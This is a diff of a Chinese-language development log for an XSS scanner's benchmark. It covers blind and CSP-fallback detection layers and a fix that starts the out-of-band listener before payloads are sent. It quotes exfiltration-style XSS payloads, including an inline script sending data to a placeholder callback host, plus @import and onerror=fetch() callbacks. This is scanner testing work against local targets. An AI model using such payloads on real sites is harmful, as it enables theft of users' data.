@@ -392,8 +392,20 @@ sync 首次跑出**全绿**（旧基线有 6 个 safe 用例因 loopback 中断�
 
 中途踩到一个必须写下来的坑：我最初只解析 `src`/`href` 属性，结果 `pos-blind-01` 判 **FN**——引擎真正用的第一个 blind 载荷是 `<script>new Image().src='https://__OOB__/?c='+...</script>`，**回调 URL 藏在内联 JS 文本里，不在任何属性上**。修法是让展开器同时看三个位置：真实元素的资源类属性、**事件处理器属性**（`onload=` 等）、以及**真实 `<script>` 元素的文本内容**；**纯文本节点一律忽略**——这正是让转义版保持沉默的那条界线。
 
-验证（三重口径）：① 目标层面直接用真载荷探小心：vuln 回连成功 / safe 不回连；② 基准口径 **TP1 TN1**，且 pos 的 finding 类型是查出来的 **`blind`**（high/high），`extra_args` 带 `--oob self`；③ 零 finding 门禁这次**必须挂真监听器**否则 blind 层根本不跑——结果为 0。
+验证（三重口径）：① 目标层面直接用引擎真实载荷打一发：vuln 回连成功 / safe 不回连；② 基准口径 **TP1 TN1**，且 pos 的 finding 类型是查出来的 **`blind`**（high/high），`extra_args` 带 `--oob self`；③ 零 finding 门禁这次**必须挂真监听器**否则 blind 层根本不跑——结果为 0。
 **修正后：49 层中 43 已覆盖，6 未覆盖**（L4_second_order、L7_mutation、L7_time_based、L8_cookie_tossing、L7_xsleak、L9_scenario）。
+
+**Phase 125：`L7_time_based` 覆盖（CSP 兜底通道），并修掉第四个基准驱动的引擎缺陷——这一层从来没能确认过任何东西**。
+
+这层的定位是"严格 CSP 挡住了 alert() 时的兜底"：标准载荷全部无法确认后，改用资源加载型载荷（`<style>@import>`、`<img src>`、`onerror=fetch()`）带 `tb_` token 打出去，再看 OOB 监听器有没有收到。类型名 **`time_based_xss`** 从代码查得。
+
+目标（`pos/neg-tb-01`）：原样反射 + **`script-src 'none'`**（注意**不能**用 `default-src 'none'`——那会把这一层赖以工作的图片/CSS 也一起禁掉，自相矛盾）+ Phase 124 那套"受害者解析并加载资源"的替身。转义版双胞胎自然沉默。
+
+写用例时发现 `pos-tb-01` 判 **FN**，逐层取证：目标层面手工打三种通道**全部回连**；SPY 显示引擎**确实发出了**这些载荷（服务端日志可见 `<style>@import url('http://127.0.0.1:8915/tb_17bd8bd1/tb_17bd8bd1')`）；但监听器收到的 token 集合里**一个 `tb_` 都没有**。根因：**全仓库只有 `_inject_blind` 会 `oob.start()`**，而 `scan_time_based` 从不启动监听器——载荷是在监听器还没起来的时候发出去的，那一刻它只是个没人听的端口，回连被拒，于是**静默什么都不报**。更糟的是它有隐蔽的顺序依赖：只有当 blind 层"碰巧"先跑过并启动了监听器时，这层才可能工作；而 blind 有自己的"响应里要有原样可执行标签"门槛，很多场景根本不会跑。**一个看起来实现完整、却永远无法确认的能力**——与 Phase 122 的 WAF 判定、Phase 123 的转义判定同一家族。
+
+修法（`time_xss.scan_time_based`）：发载荷**之前**确保监听器已启动（照 `_inject_blind` 的写法；对没有生命周期方法的简易监听器保持宽容）。附带修掉一处潜伏陷阱：`SelfHostedListener.callback_url()` 返回的 URL **已含 token**，而 `build_timing_payloads()` 又拼一次，实际发出去的是 `/<token>/<token>`——对当前"取路径第一段"的解析无害，但只要哪个监听器改成取最后一段就会立刻失效。`tests/test_time_xss.py` 新增 4 例锁定（启动必须早于首次发送、只启动一次、无生命周期监听器仍可扫、路径 token 不重复）。
+
+**修正后：49 层中 44 已覆盖，5 未覆盖**（L4_second_order、L7_mutation、L8_cookie_tossing、L7_xsleak、L9_scenario）。验证 **TP1 TN1 FP0 FN0**。
 
 **Phase 123：`L7_dom_clobber` 覆盖，并修掉第三个基准驱动的引擎缺陷（转义过的反射仍被当成真实属性）**。
 
